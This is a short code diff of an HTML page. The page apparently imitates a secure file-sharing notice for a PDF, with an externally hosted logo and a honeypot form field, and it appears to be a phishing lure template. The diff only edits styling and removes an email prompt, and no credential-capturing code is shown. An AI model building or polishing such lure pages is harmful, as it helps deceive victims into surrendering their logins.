@@ -25,8 +25,8 @@
         <div class="content">
           <img src="https://i.postimg.cc/s2TBQ89k/ldimg1.png" width="90" height="30" />
           <p>You've received a secure link to:</p>
-          <p style="font-size: 16px;">AA484937-13-06-2025.pdf</p>
-          <p style="font-size: 16px;">To proceed, enter the email that this <br />item was shared to</p>
+          <p style="font-size: 17px;">AA484937-13-06-2025.pdf</p>
+         
 
           <div class="form-wrapper">
             <label for="honeypot" class="visually-hidden">Do not fill this field (anti-bot)</label>
